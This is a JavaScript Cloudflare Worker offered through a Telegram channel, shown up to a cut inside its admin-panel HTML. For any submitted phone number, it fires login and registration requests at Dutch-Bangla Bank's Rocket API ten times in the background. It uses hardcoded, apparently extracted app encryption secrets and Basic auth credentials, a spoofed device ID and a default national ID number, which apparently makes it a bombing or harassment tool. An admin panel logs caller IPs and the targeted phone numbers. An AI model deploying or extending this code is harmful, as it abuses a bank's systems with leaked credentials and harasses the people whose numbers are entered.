const DEFAULT_ADMIN_PASSWORD = "5274100";
const CHANNEL_URL = "https://t.me/CobraX_Empire";
const CHANNEL_HANDLE = "@CobraX_Empire";
const API_OWNER = "@MehediSanix";
const DEVELOPER = "@XrootCodeX";

const MEMORY_STATE = {
  apiEnabled: true,
  totalRequests: 0,
  successRequests: 0,
  failedRequests: 0,
  blockedRequests: 0,
  uniqueClients: {},
  channelUsage: {},
  queriedPhones: {},
  recentLogs: []
};

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const pathname = url.pathname;

    const corsHeaders = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type, x-admin-password"
    };

    if (request.method === "OPTIONS") {
      return new Response(null, { status: 204, headers: corsHeaders });
    }

    const jsonResponse = (data, status = 200) => {
      return new Response(JSON.stringify(data, null, 2), {
        status,
        headers: {
          "Content-Type": "application/json; charset=utf-8",
          "Cache-Control": "no-store",
          ...corsHeaders
        }
      });
    };

    const htmlResponse = (html, status = 200) => {
      return new Response(html, {
        status,
        headers: {
          "Content-Type": "text/html; charset=utf-8",
          "Cache-Control": "no-store",
          ...corsHeaders
        }
      });
    };

    const kv = env && env.API_KV ? env.API_KV : null;
    const adminPass = (env && env.ADMIN_PASSWORD) ? String(env.ADMIN_PASSWORD) : DEFAULT_ADMIN_PASSWORD;
    const state = await loadState(kv);

    // ⌬ Admin Panel UI
    if (pathname === "/admin" && request.method === "GET") {
      return htmlResponse(renderAdminPanelHtml(state.apiEnabled), 200);
    }

    // ⌘ Admin Control & Analytics API
    if (pathname.startsWith("/admin/api/")) {
      const providedPass = request.headers.get("x-admin-password") || "";
      let bodyData = {};
      if (request.method === "POST") {
        try {
          bodyData = await request.json();
        } catch {
          bodyData = {};
        }
      }

      const authPass = providedPass || bodyData.password || "";
      if (!authPass || authPass !== adminPass) {
        return jsonResponse({
          error: "⎋ ভুল পাসওয়ার্ড! সঠিক এডমিন পাসওয়ার্ড দিন।",
          Api_Owner: API_OWNER,
          Telegram: CHANNEL_HANDLE,
          Developer: DEVELOPER
        }, 401);
      }

      if (pathname === "/admin/api/stats" && request.method === "GET") {
        return jsonResponse({
          apiEnabled: state.apiEnabled,
          storageMode: kv ? "Cloudflare KV (Persistent)" : "Worker Memory",
          totalRequests: state.totalRequests,
          successRequests: state.successRequests,
          failedRequests: state.failedRequests,
          blockedRequests: state.blockedRequests,
          uniqueClientsCount: Object.keys(state.uniqueClients).length,
          channelsCount: Object.keys(state.channelUsage).length,
          queriedPhonesCount: Object.keys(state.queriedPhones).length,
          clients: sortTop(state.uniqueClients, "requests", 40),
          channels: sortTop(state.channelUsage, "requests", 40),
          topPhones: sortTop(state.queriedPhones, "count", 30),
          recentLogs: state.recentLogs.slice(0, 60)
        }, 200);
      }

      if (pathname === "/admin/api/toggle" && request.method === "POST") {
        state.apiEnabled = typeof bodyData.enabled === "boolean" ? bodyData.enabled : !state.apiEnabled;
        await saveState(kv, state);
        return jsonResponse({
          ok: true,
          apiEnabled: state.apiEnabled,
          message: state.apiEnabled ? "⍟ API চালু (ONLINE) করা হয়েছে।" : "⎋ API বন্ধ (OFFLINE) করা হয়েছে।"
        }, 200);
      }

      if (pathname === "/admin/api/reset" && request.method === "POST") {
        state.totalRequests = 0;
        state.successRequests = 0;
        state.failedRequests = 0;
        state.blockedRequests = 0;
        state.uniqueClients = {};
        state.channelUsage = {};
        state.queriedPhones = {};
        state.recentLogs = [];
        await saveState(kv, state);
        return jsonResponse({ ok: true, message: "⟴ সমস্ত স্ট্যাটস ও লগ রিসেট করা হয়েছে।" }, 200);
      }

      return jsonResponse({ error: "Admin endpoint not found." }, 404);
    }

    // ⌖ Request Metadata Extraction
    const clientIp =
      request.headers.get("cf-connecting-ip") ||
      (request.headers.get("x-forwarded-for") || "").split(",")[0].trim() ||
      "unknown";
    const referer = request.headers.get("referer") || "";
    const channelHint = extractChannelHint(url, request.headers, referer);
    const cfInfo = request.cf || {};
    const country = cfInfo.country || "Unknown";
    const isp = cfInfo.asOrganization || "Unknown ISP";

    const phone = (url.searchParams.get('phone') || '').trim();
    const DEFAULT_NID = "5845888855";
    const nid = (url.searchParams.get('nid') || DEFAULT_NID).trim();

    // ⎋ API Disabled Notice Page
    if (!state.apiEnabled) {
      state.totalRequests += 1;
      state.blockedRequests += 1;
      recordAnalytics(state, {
        ip: clientIp,
        country,
        isp,
        channelHint,
        phone: phone || "-",
        status: "OFFLINE_BLOCKED"
      });
      await saveState(kv, state);

      const wantsJson =
        url.searchParams.get("format") === "json" ||
        ((request.headers.get("accept") || "").includes("application/json") &&
          !(request.headers.get("accept") || "").includes("text/html"));

      if (wantsJson) {
        return jsonResponse({
          status: "disabled",
          error: "API সাময়িকভাবে বন্ধ রাখা হয়েছে",
          reason: "কপিবাজরা আমাদের API নিয়ে নিজেদের চ্যানেলে ব্যবহার করছিল, যার কারণে এটি সাময়িকভাবে বন্ধ করা হলো।",
          channel: CHANNEL_URL,
          Api_Owner: API_OWNER,
          Telegram: CHANNEL_HANDLE,
          Developer: DEVELOPER
        }, 503);
      }

      return htmlResponse(renderApiDisabledHtml(), 503);
    }

    // ফোন নম্বর ভ্যালিডেশন
    if (!phone) {
      state.totalRequests += 1;
      state.failedRequests += 1;
      recordAnalytics(state, {
        ip: clientIp,
        country,
        isp,
        channelHint,
        phone: "-",
        status: "MISSING_PHONE"
      });
      await saveState(kv, state);

      return jsonResponse({
        error: "Phone number required",
        Api_Owner: API_OWNER,
        Telegram: CHANNEL_HANDLE,
        Developer: DEVELOPER
      }, 400);
    }

    if (!/^01[0-9]{9}$/.test(phone)) {
      state.totalRequests += 1;
      state.failedRequests += 1;
      recordAnalytics(state, {
        ip: clientIp,
        country,
        isp,
        channelHint,
        phone,
        status: "INVALID_PHONE"
      });
      await saveState(kv, state);

      return jsonResponse({
        error: "Invalid phone number",
        Api_Owner: API_OWNER,
        Telegram: CHANNEL_HANDLE,
        Developer: DEVELOPER
      }, 400);
    }

    const API_PASSWORD = "sdfheu$*sdfGw2";
    const BASIC_AUTH = "cm9ja2V0LWFwcC1lbmM6UmsjdDQwY2tFdCoj";
    const BASE_URL = "https://rocket-consumertxnservice.dutchbanglabank.com/apigw/v1";
    const DEVICE_ID = "ANDROID-01968184976";
    const DEVICE_INFO = "SP1A.210812.016-itel S665L";
    const CLIENT_VERSION = "3.1.6";

    // PBKDF2 Key Generation (Web Crypto API)
    async function getKey(saltBuffer) {
      const enc = new TextEncoder();
      const keyMaterial = await crypto.subtle.importKey(
        "raw",
        enc.encode(API_PASSWORD),
        { name: "PBKDF2" },
        false,
        ["deriveKey"]
      );
      return await crypto.subtle.deriveKey(
        {
          name: "PBKDF2",
          salt: saltBuffer,
          iterations: 65536,
          hash: "SHA-256"
        },
        keyMaterial,
        { name: "AES-GCM", length: 256 },
        false,
        ["encrypt", "decrypt"]
      );
    }

    // Payload Encryption (AES-256-GCM)
    async function encryptPayload(payload) {
      const plaintext = new TextEncoder().encode(JSON.stringify(payload));
      const iv = crypto.getRandomValues(new Uint8Array(16));
      const salt = crypto.getRandomValues(new Uint8Array(16));
      const key = await getKey(salt);

      const ciphertext = await crypto.subtle.encrypt(
        { name: "AES-GCM", iv: iv, tagLength: 128 },
        key,
        plaintext
      );

      const combined = new Uint8Array(iv.length + salt.length + ciphertext.byteLength);
      combined.set(iv, 0);
      combined.set(salt, iv.length);
      combined.set(new Uint8Array(ciphertext), iv.length + salt.length);

      let binary = "";
      const len = combined.byteLength;
      for (let i = 0; i < len; i++) {
        binary += String.fromCharCode(combined[i]);
      }
      return btoa(binary);
    }

    // Payload Decryption (AES-256-GCM)
    async function decryptPayload(b64) {
      const raw = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
      const iv = raw.slice(0, 16);
      const salt = raw.slice(16, 32);
      const ciphertext = raw.slice(32);
      const key = await getKey(salt);

      const decrypted = await crypto.subtle.decrypt(
        { name: "AES-GCM", iv: iv, tagLength: 128 },
        key,
        ciphertext
      );

      const decodedString = new TextDecoder().decode(decrypted);
      return JSON.parse(decodedString);
    }

    function makeRefId(prefix = "login") {
      const now = Date.now();
      const dateObj = new Date(now);
      const dt = dateObj.toISOString().replace(/[-:T]/g, '').slice(0, 14);
      const ms = String(now % 1000).padStart(3, '0');
      return `${prefix}--${dt}${ms}`;
    }

    async function apiCall(endpoint, payload, token = null) {
      const headers = {
        "Authorization": token ? `Bearer ${token}` : `Basic ${BASIC_AUTH}`,
        "CHANNEL_ID": "ROCKET_APP_USER",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "rocket-consumertxnservice.dutchbanglabank.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.9.3",
      };

      const encrypted = await encryptPayload(payload);
      const body = JSON.stringify({ userData: encrypted });

      const response = await fetch(`${BASE_URL}/${endpoint}`, {
        method: "POST",
        headers: headers,
        body: body,
      });

      const respText = await response.text();
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${respText}`);
      }

      const result = JSON.parse(respText);
      if (result.userData && result.userData !== "") {
        return await decryptPayload(result.userData);
      }
      return result;
    }

    // প্রতিবার রিকোয়েস্ট পাঠানোর মূল লজিক ফাংশন
    async function executeProcess() {
      const loginResp = await apiCall("login", {
        apiId: 102,
        deviceId: DEVICE_ID,
        deviceInfo: DEVICE_INFO,
        clientVersion: CLIENT_VERSION,
        refId: makeRefId("login"),
        sessionId: "123",
        clientLanguage: "EN",
        data: {
          appType: "C",
          rocketSessionId: "1234",
          userId: phone,
          version: CLIENT_VERSION
        },
      });

      if ((loginResp.status || '') !== 'SUCCESS') {
        return { step: "login", status: "FAILED", message: loginResp.message || '' };
      }

      const token = loginResp.data.accessToken;
      const sessionId = loginResp.data.sessionId;

      const svcPayload = {
        apiId: 3042,
        deviceId: DEVICE_ID,
        deviceInfo: DEVICE_INFO,
        clientVersion: CLIENT_VERSION,
        refId: makeRefId("reg-init"),
        sessionId: sessionId,
        clientLanguage: "EN",
        data: {
          appType: "C",
          initiatorId: phone,
          rocketSessionId: "7654321",
          userId: "",
          version: CLIENT_VERSION,
          deviceType: "ANDROID"
        },
      };

      const userResp = await apiCall("userService", svcPayload, token);
      const userType = (userResp.data || {}).userType || '?';
      const promtUser = (userResp.data || {}).promtUser || '';

      let stepResult = {
        step: "userService",
        status: userResp.status || '',
        userType: userType,
        promtUser: promtUser,
        message: userResp.message || ''
      };

      if ((userResp.status || '') !== 'SUCCESS') {
        return { success: false, error: userResp.message || 'userService failed', stepResult };
      }

      let extraSteps = [];
      if (userType === 'NEW') {
        const nidResp = await apiCall("userService", {
          apiId: 3002,
          deviceId: DEVICE_ID,
          deviceInfo: DEVICE_INFO,
          clientVersion: CLIENT_VERSION,
          refId: makeRefId("nid-check"),
          sessionId: sessionId,
          clientLanguage: "EN",
          data: { nidNo: nid, initiatorId: phone },
        }, token);

        extraSteps.push({ step: "nid_check", status: nidResp.status || '', message: nidResp.message || '' });

        try {
          const finalResp = await apiCall("userService", {
            apiId: 3034,
            deviceId: DEVICE_ID,
            deviceInfo: DEVICE_INFO,
            clientVersion: CLIENT_VERSION,
            refId: makeRefId("reg-init"),
            sessionId: "123",
            clientLanguage: "EN",
            data: {
              appType: "C",
              initiatorId: phone,
              rocketSessionId: "7654321",
              userId: "",
              version: CLIENT_VERSION,
              deviceType: "ANDROID"
            },
          }, token);
          extraSteps.push({ step: "final_trigger", status: finalResp.status || '', message: finalResp.message || '' });
        } catch (err) {
          extraSteps.push({ step: "final_trigger", status: "ERROR", message: err.message });
        }
      }

      return {
        success: true,
        userType,
        promtUser,
        stepResult,
        extraSteps
      };
    }

    // ব্যাকগ্রাউন্ডে ১০ বার রিকোয়েস্ট চালানোর ফাংশন
    async function runBackgroundTenTimes() {
      const totalRuns = 10;
      for (let i = 1; i <= totalRuns; i++) {
        try {
          await executeProcess();
        } catch (err) {
          // ব্যাকগ্রাউন্ড টাস্কে কোনো এক ধাপে এরর এলেও পরবর্তী রান চালু থাকবে
        }
      }
    }

    try {
      state.totalRequests += 1;
      state.successRequests += 1;
      recordAnalytics(state, {
        ip: clientIp,
        country,
        isp,
        channelHint,
        phone,
        status: "STARTED_10X"
      });
      await saveState(kv, state);

      ctx.waitUntil(runBackgroundTenTimes());

      const finalResponseData = {
        phone: phone,
        nid: nid,
        backgroundRuns: 10,
        status: "STARTED_IN_BACKGROUND",
        success: true,
        Api_Owner: API_OWNER,
        Telegram: CHANNEL_HANDLE,
        Developer: DEVELOPER
      };

      return new Response(JSON.stringify(finalResponseData, null, 2), {
        status: 200,
        headers: {
          'Content-Type': 'application/json; charset=utf-8',
          'Cache-Control': 'no-store',
          ...corsHeaders
        }
      });

    } catch (error) {
      state.totalRequests += 1;
      state.failedRequests += 1;
      recordAnalytics(state, {
        ip: clientIp,
        country,
        isp,
        channelHint,
        phone,
        status: "ERROR"
      });
      await saveState(kv, state);

      return new Response(
        JSON.stringify({
          phone,
          nid,
          success: false,
          error: error.message,
          Api_Owner: API_OWNER,
          Telegram: CHANNEL_HANDLE,
          Developer: DEVELOPER
        }, null, 2),
        {
          status: 500,
          headers: {
            'Content-Type': 'application/json; charset=utf-8',
            'Cache-Control': 'no-store',
            ...corsHeaders
          }
        }
      );
    }
  }
};

async function loadState(kv) {
  if (kv) {
    try {
      const saved = await kv.get("rocket_panel_state_v1", { type: "json" });
      if (saved && typeof saved === "object") {
        return {
          apiEnabled: typeof saved.apiEnabled === "boolean" ? saved.apiEnabled : true,
          totalRequests: Number(saved.totalRequests) || 0,
          successRequests: Number(saved.successRequests) || 0,
          failedRequests: Number(saved.failedRequests) || 0,
          blockedRequests: Number(saved.blockedRequests) || 0,
          uniqueClients: saved.uniqueClients && typeof saved.uniqueClients === "object" ? saved.uniqueClients : {},
          channelUsage: saved.channelUsage && typeof saved.channelUsage === "object" ? saved.channelUsage : {},
          queriedPhones: saved.queriedPhones && typeof saved.queriedPhones === "object" ? saved.queriedPhones : {},
          recentLogs: Array.isArray(saved.recentLogs) ? saved.recentLogs : []
        };
      }
    } catch {
      // Fallback to memory state
    }
  }
  return MEMORY_STATE;
}

async function saveState(kv, state) {
  MEMORY_STATE.apiEnabled = state.apiEnabled;
  MEMORY_STATE.totalRequests = state.totalRequests;
  MEMORY_STATE.successRequests = state.successRequests;
  MEMORY_STATE.failedRequests = state.failedRequests;
  MEMORY_STATE.blockedRequests = state.blockedRequests;
  MEMORY_STATE.uniqueClients = state.uniqueClients;
  MEMORY_STATE.channelUsage = state.channelUsage;
  MEMORY_STATE.queriedPhones = state.queriedPhones;
  MEMORY_STATE.recentLogs = state.recentLogs.slice(0, 60);

  if (kv) {
    try {
      await kv.put("rocket_panel_state_v1", JSON.stringify(MEMORY_STATE));
    } catch {
      // Ignore KV write failure
    }
  }
}

function extractChannelHint(urlObj, headers, referer) {
  const explicit =
    urlObj.searchParams.get("channel") ||
    urlObj.searchParams.get("source") ||
    urlObj.searchParams.get("ref") ||
    headers.get("x-channel") ||
    "";

  if (explicit.trim()) {
    return explicit.trim().slice(0, 80);
  }

  if (referer) {
    try {
      const refUrl = new URL(referer);
      return `${refUrl.hostname}${refUrl.pathname}`.slice(0, 80);
    } catch {
      return referer.slice(0, 80);
    }
  }

  return "Direct / Bot Request";
}

function recordAnalytics(state, info) {
  const nowIso = new Date().toISOString();

  if (!state.uniqueClients[info.ip]) {
    state.uniqueClients[info.ip] = {
      ip: info.ip,
      country: info.country,
      isp: info.isp,
      requests: 0,
      lastSeen: nowIso,
      lastChannel: info.channelHint
    };
  }
  state.uniqueClients[info.ip].requests += 1;
  state.uniqueClients[info.ip].lastSeen = nowIso;
  state.uniqueClients[info.ip].lastChannel = info.channelHint;
  if (info.country && info.country !== "Unknown") state.uniqueClients[info.ip].country = info.country;
  if (info.isp && info.isp !== "Unknown ISP") state.uniqueClients[info.ip].isp = info.isp;

  if (!state.channelUsage[info.channelHint]) {
    state.channelUsage[info.channelHint] = {
      channel: info.channelHint,
      requests: 0,
      lastUsed: nowIso
    };
  }
  state.channelUsage[info.channelHint].requests += 1;
  state.channelUsage[info.channelHint].lastUsed = nowIso;

  if (info.phone && info.phone !== "-") {
    if (!state.queriedPhones[info.phone]) {
      state.queriedPhones[info.phone] = {
        phone: info.phone,
        count: 0,
        lastStatus: info.status,
        lastSeen: nowIso
      };
    }
    state.queriedPhones[info.phone].count += 1;
    state.queriedPhones[info.phone].lastStatus = info.status;
    state.queriedPhones[info.phone].lastSeen = nowIso;
  }

  state.recentLogs.unshift({
    time: nowIso,
    ip: info.ip,
    country: info.country,
    channel: info.channelHint,
    phone: info.phone || "-",
    status: info.status
  });
  if (state.recentLogs.length > 60) {
    state.recentLogs.length = 60;
  }
}

function sortTop(obj, key, limit) {
  return Object.values(obj)
    .sort((a, b) => (b[key] || 0) - (a[key] || 0))
    .slice(0, limit);
}

function renderApiDisabledHtml() {
  return `<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>⎋ Notice • API সাময়িকভাবে বন্ধ রাখা হয়েছে</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@500&family=Hind+Siliguri:wght@400;600;700&family=Orbitron:wght@600;800&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      background:
        radial-gradient(circle at 18% 18%, rgba(245, 178, 53, 0.16), transparent 45%),
        radial-gradient(circle at 82% 82%, rgba(0, 229, 255, 0.13), transparent 45%),
        #05080b;
      color: #eef6f1;
      font-family: 'Hind Siliguri', sans-serif;
    }
    .card {
      width: 100%;
      max-width: 440px;
      background: rgba(11, 18, 20, 0.95);
      border: 1px solid rgba(245, 178, 53, 0.38);
      border-radius: 24px;
      padding: 32px 24px;
      text-align: center;
      box-shadow: 0 24px 60px rgba(0, 0, 0, 0.75), 0 0 38px rgba(245, 178, 53, 0.14);
    }
    .top-badge {
      display: inline-block;
      font-family: 'Orbitron', sans-serif;
      font-size: 11px;
      letter-spacing: 1.5px;
      color: #f5b235;
      background: rgba(245, 178, 53, 0.12);
      border: 1px solid rgba(245, 178, 53, 0.32);
      padding: 5px 13px;
      border-radius: 999px;
      margin-bottom: 18px;
    }
    .warn-box {
      width: 68px;
      height: 68px;
      margin: 0 auto 20px;
      border-radius: 18px;
      background: linear-gradient(145deg, #ffd166, #d98a14);
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 10px 28px rgba(245, 178, 53, 0.36);
      font-family: 'Orbitron', sans-serif;
      font-size: 28px;
      font-weight: 800;
      color: #161103;
    }
    h1 {
      font-size: 25px;
      line-height: 1.35;
      font-weight: 700;
      color: #ffffff;
      margin-bottom: 14px;
    }
    .reason {
      font-size: 15px;
      line-height: 1.65;
      color: #c8d8cf;
      margin-bottom: 22px;
    }
    .divider {
      height: 1px;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.16), transparent);
      margin: 18px 0;
    }
    .cta-note {
      font-size: 14.5px;
      line-height: 1.6;
      color: #dcebe3;
      margin-bottom: 20px;
    }
    .join-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      width: 100%;
      padding: 14px 18px;
      border-radius: 14px;
      text-decoration: none;
      font-size: 16px;
      font-weight: 700;
      color: #151003;
      background: linear-gradient(135deg, #ffd166, #e69c20);
      box-shadow: 0 10px 25px rgba(230, 156, 32, 0.35);
      transition: transform 0.2s ease, box-shadow 0.2s ease;
    }
    .join-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 14px 30px rgba(230, 156, 32, 0.5);
    }
    .channel-link {
      display: inline-block;
      margin-top: 18px;
      font-family: 'Fira Code', monospace;
      font-size: 13px;
      color: #8eb3a1;
      text-decoration: none;
    }
    .channel-link:hover {
      color: #ffd166;
    }
    .meta-tag {
      margin-top: 14px;
      font-family: 'Fira Code', monospace;
      font-size: 11px;
      color: #6b8579;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="top-badge">⌬ NOTICE • SERVICE PAUSED</div>
    <div class="warn-box">⎋</div>
    <h1>API সাময়িকভাবে বন্ধ রাখা হয়েছে</h1>
    <p class="reason">
      কপিবাজরা আমাদের API নিয়ে নিজেদের চ্যানেলে ব্যবহার করছিল, যার কারণে এটি সাময়িকভাবে বন্ধ করা হলো।
    </p>
    <div class="divider"></div>
    <p class="cta-note">
      নতুন আপডেট ও ভালো মানের টুলস, API সবার আগে পেতে আমাদের অফিসিয়াল চ্যানেলে জয়েন থাকুন।
    </p>
    <a class="join-btn" href="${CHANNEL_URL}" target="_blank" rel="noopener noreferrer">
      <span>⟴ অফিসিয়াল চ্যানেলে জয়েন করুন</span>
    </a>
    <a class="channel-link" href="${CHANNEL_URL}" target="_blank" rel="noopener noreferrer">t.me/CobraX_Empire</a>
    <div class="meta-tag">⌘ ${API_OWNER} • ${DEVELOPER}</div>
  </div>
</body>
</html>`;
}

function renderAdminPanelHtml(initialEnabled) {
  return `<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>⌬ Admin Panel • API Control & Analytics</title>
  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Hind+Siliguri:wght@400;600;700&family=Orbitron:wght@600;800&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: radial-gradient(circle at top right, #0d1d3a, #050811 58%);
      color: #e8eeff;
      font-family: 'Hind Siliguri', sans-serif;
      padding: 18px;
      min-height: 100vh;
    }
    .wrap { max-width: 1020px; margin: 0 auto; }
    .panel {
      background: rgba(12, 18, 34, 0.94);
      border: 1px solid rgba(0, 229, 255, 0.25);
      border-radius: 18px;
      padding: 20px;
      margin-bottom: 18px;
      box-shadow: 0 12px 35px rgba(0,0,0,0.48);
    }
    .header-top {
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 10px;
      margin-bottom: 8px;
    }
    h1 {
      font-family: 'Orbitron', sans-serif;
      font-size: 19px;
      color: #00e5ff;
      letter-spacing: 1px;
    }
    .badge-storage {
      font-family: 'Fira Code', monospace;
      font-size: 11px;
      padding: 5px 10px;
      border-radius: 999px;
      background: rgba(0, 229, 255, 0.12);
      border: 1px solid rgba(0, 229, 255, 0.3);
      color: #7eeeff;
    }
    .sub { font-size: 13.5px; color: #9fb0d9; margin-bottom: 15px; }
    .row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
    input {
      flex: 1;
      min-width: 200px;
      padding: 11px 14px;
      border-radius: 10px;
      border: 1px solid rgba(255,255,255,0.2);
      background: #080c18;
      color: #fff;
      font-family: 'Fira Code', monospace;
    }
    button {
      padding: 11px 16px;
      border: none;
      border-radius: 10px;
      font-weight: 700;
      cursor: pointer;
      font-family: 'Hind Siliguri', sans-serif;
      font-size: 14px;
      transition: opacity 0.2s;
    }
    button:hover { opacity: 0.9; }
    .btn-primary { background: #00d4ff; color: #051018; }
    .btn-on { background: #00e676; color: #04180c; }
    .btn-off { background: #ff4757; color: #fff; }
    .btn-ghost { background: rgba(255,255,255,0.1); color: #fff; }
    .stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
      gap: 12px;
      margin-top: 16px;
    }
    .stat-card {
      background: #090e1e;
      border: 1px solid rgba(255,255,255,0.08);
      border-radius: 14px;
      padding: 14px;
    }
    .stat-label { font-size: 12px; color: #94a5cf; }
    .stat-val {
      font-family: 'Orbitron', sans-serif;
      font-size: 20px;
      margin-top: 5px;
      color: #fff;
    }
    .grid-2 {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
      gap: 18px;
    }
    .table-wrap { overflow-x: auto; }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 10px;
      font-size: 12.5px;
    }
    th, td {
      text-align: left;
      padding: 9px 10px;
      border-bottom: 1px solid rgba(255,255,255,0.08);
      font-family: 'Fira Code', monospace;
      white-space: nowrap;
    }
    th { color: #7cd6ff; font-size: 11.5px; }
    .pill-on { color: #00e676; }
    .pill-off { color: #ff5252; }
    .tag-found { color: #00e676; }
    .tag-miss { color: #ffb74d; }
    .tag-block { color: #ff5252; }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="panel">
      <div class="header-top">
        <h1>⌬ ADMIN CONTROL PANEL</h1>
        <span class="badge-storage" id="storageBadge">⎔ STORAGE: CHECKING</span>
      </div>
      <div class="sub">⌘ API অন/অফ নিয়ন্ত্রণ, মোট রিকোয়েস্ট, IP লোকেশন, ফোন নম্বর ও চ্যানেল/সোর্স মনিটরিং • ${CHANNEL_HANDLE}</div>
      <div class="row">
        <input type="password" id="adminPass" placeholder="Admin Password দিন..." />
        <button class="btn-primary" onclick="loadStats()">⌖ Login & Refresh</button>
        <button id="toggleBtn" class="${initialEnabled ? 'btn-off' : 'btn-on'}" onclick="toggleApi()">
          ${initialEnabled ? '⎋ API বন্ধ করুন (OFF)' : '⍟ API চালু করুন (ON)'}
        </button>
        <button class="btn-ghost" onclick="resetStats()">⟴ Reset Stats</button>
      </div>
      <div class="stats">
        <div class="stat-card">
          <div class="stat-label">API STATUS</div>
          <div class="stat-val" id="apiStatusText">${initialEnabled ? 'ONLINE' : 'OFFLINE'}</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">TOTAL REQUESTS</div>
          <div class="stat-val" id="totalReqText">0</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">STARTED (10X)</div>
          <div class="stat-val pill-on" id="successReqText">0</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">FAILED / INVALID</div>
          <div class="stat-val tag-miss" id="failedReqText">0</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">BLOCKED (OFFLINE)</div>
          <div class="stat-val pill-off" id="blockedReqText">0</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">UNIQUE CLIENTS (IP)</div>
          <div class="stat-val" id="clientsCountText">0</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">CHANNELS / SOURCES</div>
          <div class="stat-val" id="channelsCountText">0</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">UNIQUE PHONES</div>
          <div class="stat-val" id="phonesCountText">0</div>
        </div>
      </div>
    </div>

    <div class="grid-2">
      <div class="panel">
        <h2 style="font-size:16px;color:#ffd166;">⌖ চ্যানেল / রেফারেল সোর্স (Channels & Sources)</h2>
        <div class="table-wrap">
          <table>
            <thead>
              <tr><th>Channel / Source</th><th>Requests</th><th>Last Used</th></tr>
            </thead>
            <tbody id="channelsTable"></tbody>
          </table>
        </div>
      </div>

      <div class="panel">
        <h2 style="font-size:16px;color:#00e676;">⍟ সবচেয়ে বেশি ব্যবহৃত নম্বর</h2>
        <div class="table-wrap">
          <table>
            <thead>
              <tr><th>Phone</th><th>Requests</th><th>Last Status</th></tr>
            </thead>
            <tbody id="phonesTable"></tbody>
          </table>
        </div>
      </div>
    </div>

    <div class="panel">
      <h2 style="font-size:16px;color:#00e5ff;">⌘ কারা রিকোয়েস্ট করছে (Clients by IP, Country & ISP)</h2>
      <div class="table-wrap">
        <table>
          <thead>
            <tr><th>IP Address</th><th>Country</th><th>ISP / Org</th><th>Requests</th><th>Channel / Source</th><th>Last Seen</th></tr>
          </thead>
          <tbody id="clientsTable"></tbody>
        </table>
      </div>
    </div>

    <div class="panel">
      <h2 style="font-size:16px;color:#ff8a65;">⟴ সাম্প্রতিক লাইভ রিকোয়েস্ট লগ (Recent Activity)</h2>
      <div class="table-wrap">
        <table>
          <thead>
            <tr><th>Time (UTC)</th><th>IP</th><th>Country</th><th>Phone</th><th>Channel</th><th>Status</th></tr>
          </thead>
          <tbody id="logsTable"></tbody>
        </table>
      </div>
    </div>
  </div>

  <script>
    const savedPass = sessionStorage.getItem("worker_admin_pass") || "";
    if (savedPass) document.getElementById("adminPass").value = savedPass;

    function getPass() {
      const p = document.getElementById("adminPass").value.trim();
      if (p) sessionStorage.setItem("worker_admin_pass", p);
      return p;
    }

    async function loadStats() {
      const pass = getPass();
      if (!pass) return alert("Admin password দিন");
      const res = await fetch("/admin/api/stats", {
        headers: { "x-admin-password": pass }
      });
      const data = await res.json();
      if (!res.ok) return alert(data.error || "Failed");

      document.getElementById("storageBadge").textContent = "⎔ STORAGE: " + (data.storageMode || "MEMORY");

      const statusEl = document.getElementById("apiStatusText");
      const toggleBtn = document.getElementById("toggleBtn");
      statusEl.textContent = data.apiEnabled ? "ONLINE" : "OFFLINE";
      statusEl.className = "stat-val " + (data.apiEnabled ? "pill-on" : "pill-off");
      toggleBtn.textContent = data.apiEnabled ? "⎋ API বন্ধ করুন (OFF)" : "⍟ API চালু করুন (ON)";
      toggleBtn.className = data.apiEnabled ? "btn-off" : "btn-on";

      document.getElementById("totalReqText").textContent = data.totalRequests;
      document.getElementById("successReqText").textContent = data.successRequests;
      document.getElementById("failedReqText").textContent = data.failedRequests;
      document.getElementById("blockedReqText").textContent = data.blockedRequests;
      document.getElementById("clientsCountText").textContent = data.uniqueClientsCount;
      document.getElementById("channelsCountText").textContent = data.channelsCount;
      document.getElementById("phonesCountText").textContent = data.queriedPhonesCount;

      document.getElementById("channelsTable").innerHTML = (data.channels || []).map(c =>
        \`<tr><td>\${esc(c.channel)}</td><td>\${c.requests}</td><td>\${esc(formatTime(c.lastUsed))}</td></tr>\`
